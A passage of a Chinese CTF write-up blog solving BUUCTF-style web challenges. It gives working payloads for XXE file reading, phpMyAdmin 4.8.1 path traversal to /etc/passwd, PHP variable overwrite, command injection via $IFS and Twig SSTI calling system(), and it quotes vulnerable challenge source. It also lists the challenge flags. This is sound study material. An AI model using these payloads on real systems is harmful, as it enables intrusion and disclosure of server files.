        	<span class="token keyword">var</span> code <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
        	<span class="token keyword">var</span> msg <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"error:"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">XMLHttpRequest<span class="token punctuation">,</span>textStatus<span class="token punctuation">,</span>errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>errorThrown <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> textStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Fake XML cookbook&gt;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">XML外部实体（XXE）注入详解 - 渗透测试中心 - 博客园</a></p>
<p>好长（😓😰</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c85daba0fa2608792507c6814ab6be7d.png"></p>
<p>username这里可</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> 

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span><span class="token punctuation">&gt;</span></span>

&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>


<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>xaxaxa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag{601aea4d-8dfc-4651-a212-0271dcf90759}</p>
<hr>
<h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fc4bfa32f44415f4ef71bc8fa0ac19d6.png"></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">【首发】phpmyadmin4.8.1后台getshell</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/18c2813b1aa6a47d71a1113fd183c5c9.png"></p>
<p><del>这版本号很难不怀疑是先射箭后画靶（</del></p>
<pre class="line-numbers language-none"><code class="language-none">?target=db_sql.php%253f/../../../../../../etc/passwd #发现可
?target=db_sql.php%253f/../../../../../../flag
flag{23e69c98-808e-4a00-9cdb-a5caff9299f6}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>说实话，有点炫酷（</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/892f0ddbef34f3312a4405fbb403b39b.png"></p>
<p>又是git</p>
<p>嘶，但是index.php有点损坏，于是从github上拿了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php

<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dog"</span><span class="token punctuation">;</span>
<span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cat"</span><span class="token punctuation">;</span>
<span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yds'</span><span class="token punctuation">;</span>
<span class="token comment"># 遍历通过 POST 方法传递过来的所有参数</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment"># 动态创建或修改变量，将 POST 参数的键作为变量名，值作为变量　　　</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span>  <span class="token punctuation">;</span> <span class="token comment">#x=y=&gt;$x=y</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>　　　 
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span> <span class="token comment">#?x=y=&gt;$x=$y</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=&gt;</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">#$flag=$x;$x!='flag'</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">#存在$flag且一个即可</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"the flag is: "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>exit($flag)</code> 就是将变量 <code>$flag</code> 的值作为参数传递给 <code>exit</code>。</p>
<p>(1) exit($handsome):</p>
<p>$x与$flag值相同但$x不是$flag,即要保证 <code>$_GET['flag']</code> 的值等于某个除 <code>'flag'</code> 之外的 GET 参数的键名，只要$flag=$num1&amp;$num1=$anything。而且必须有一个是$x=$handsome,$y=flag以覆盖’yds’（?handsome=flag)。</p>
<p>so,<code>?handsome=flag&amp;flag=qing&amp;qing=qihai</code></p>
<p>(2) exit($yds):</p>
<p>$yds=$flag即可。<code>?yds=flag</code></p>
<p>(3) exit($is):</p>
<p>?is=flag而且直接$flag=$flag.<code>?is=flag&amp;flag=flag</code></p>
<p>(4)echo :</p>
<p><code>get</code> 传参数的时候，如果传入<code>1</code>，默认:做为键:类型是 <code>int</code>; 做为值，类型是 <code>string</code></p>
<p><code>$_GET['flag'] === $x</code> : 如果传入 <code>a=flag&amp;flag=anything</code> 那么 判断 <code>a=flag</code> 的时候 <code>$_GET['flag']</code> 是 <code>a</code>, <code>&amp;x</code> 是 <code>a</code>，完全相等 进入if条件, 而如果传入 <code>1=flag&amp;flag=1</code> 那么判断 <code>1=flag</code>的时候 <code>$_GET['flag']</code> 是 <code>(string)1</code> ，<code>&amp;x</code> 是 <code>(int)1</code> 不完全相等，无法进入if条件，进而绕过。</p>
<p><code>?1=flag&amp;flag=1</code></p>
<hr>
<h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><blockquote>
<p>这个错误信息 <code>Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:3) in /var/www/html/index.php on line 4</code> 是 PHP 中一个常见的错误，它表明你在尝试修改 HTTP 响应头时，响应头已经被发送出去了。</p>
<p>在 PHP 里，HTTP 响应头必须在任何实际的输出（像 HTML 内容、空格、换行符等）之前发送。一旦有输出产生，PHP 就会自动把响应头发送给客户端，之后再尝试修改响应头就会触发这个错误。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/951c27a59a316c07b87d61cf4e91c280.png"></p>
<p>看着好像robot(</p>
<p><del>哈哈果然有，赌狗大胜利（</del></p>
<p><del>啊啊啊竟然是假的，赌狗大失败</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/dc253305a2a22325b0b8957420b71c6d.png"></p>
<p>！！！又站起来了</p>
<p>😰什么__图，哈人(尤其是我的还乱码，让我安了个扩展修了一遍)</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt; img src="/img.jpg"&gt;
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//level 1</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2020</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment">#intval 函数用于获取变量的整数值。</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//level 2</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span><span class="token punctuation">;</span>
   <span class="token keyword">else</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//get flag</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">#需不包含空格</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#过滤cat</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
去非洲吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>哈哈哈哈哈哈我在B站/抖上经常看这up的视频（</p>
<blockquote>
<p>intval ( mixed $var [, int $base = 10 ] ) : int<br>$var：要转换为整数的变量，可以是字符串、浮点数等。<br>$base：转换所使用的进制，默认为十进制（10）。</p>
<p><code>intval</code> 函数在处理字符串时，会从字符串开头提取有效的数字部分，直到遇到非数字字符为止。</p>
</blockquote>
<ol>
<li><strong><code>$num</code> 的值</strong>：我们将 <code>$num</code> 赋值为 <code>"2019e10"</code>。在科学计数法中，<code>2019e10</code> 表示 <code>2019 * 10^10</code>。</li>
<li><strong><code>intval($num)</code> 的计算</strong>：当对 <code>"2019e10"</code> 调用 <code>intval</code> 函数时，它会从字符串开头提取数字部分，即只取到 <code>"2019"</code>，所以 <code>intval($num)</code> 的结果是 2019，满足 <code>intval($num) &lt; 2020</code>。</li>
<li><strong><code>intval($num + 1)</code> 的计算</strong>：在 PHP 中，当一个字符串和一个整数进行加法运算时，会先将字符串尝试转换为数字。<code>"2019e10"</code> 会被转换为科学计数法表示的数值，即 <code>2019 * 10^10</code>，然后加 1 后再调用 <code>intval</code> 函数，由于这个数值远远大于 2021，所以 <code>intval($num + 1) &gt; 2021</code> 成立。</li>
<li><strong>表达式结果</strong>：由于两个条件都满足，所以整个表达式 <code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code> 的结果为 <code>true</code>。</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dre0m1/p/16062369.html">PHP中MD5和sha1绕过方式总结 - dre0m1 - 博客园</a></p>
<p><code>0e215962017</code> 的 MD5 值也是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等</p>
<blockquote>
<p><code>strstr</code> 函数用于查找字符串在另一个字符串中首次出现的位置，并返回从该位置到字符串末尾的部分。如果未找到，则返回 <code>false</code>。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$search</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$subject</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>$search</code>：要查找并替换的字符串或数组。</li>
<li><code>$replace</code>：用于替换 <code>$search</code> 的字符串或数组。</li>
<li><code>$subject</code>：要在其中进行替换操作的字符串或数组。</li>
<li><code>$count</code>：可选参数，用于记录替换发生的次数。</li>
</ul>
</blockquote>
<p><code>ls</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0eb6cd922ba7eee36797439d7ecdbb3d.png"></p>
<p><del>吓死了第一眼还以为flag是个图片</del></p>
<pre class="line-numbers language-none"><code class="language-none">?num=2019e10&amp;md5=0e215962017&amp;get_flag=tail$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
flag{792fd7de-6906-4c7c-8fab-a153c66377d3}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>​	<!-- Why not take a closer look at cookies? --></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2130787">一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云</a></p>
<p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250218130008075.png" alt="image-20250218130008075"></p>
<p>另：<code>{{7*'7'}}</code>在Twig中返回<code>49</code>，在Jinja2中返回<code>77777777</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8fd1c993d8b96fabcaa7767f11ff1745.png"></p>
<ul>
<li></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fe001932fec08dee373fa155f9db9668.png"></p>
<p>意思是这个BJDCTF考了两遍Twig，<del>what can I say(</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2311f4524bead78403c2d186c4d84c36.png"></p>
<p>xaxaxa</p>
<pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls /")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8e7ad35e42e2f858784f923c139bf41c.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/afd1a322d76d2ad1ed3f2d3006f2d31b.png"></p>
<hr>
<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007250604">PHP之十六个魔术方法详解 - The code - SegmentFault 思否网</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token comment">//flag is in flag.php</span>
<span class="token comment">//WTF IS THIS?</span>
<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="token comment">//And Crack It!</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//目标</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//__invoke方法会在对象被当作函数调用时触发</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//here</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//类被当成字符串时的回应方法</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">;</span><span class="token comment">//str无source</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//反序列化一个Show实例时，会触发__wakeup方法</span>
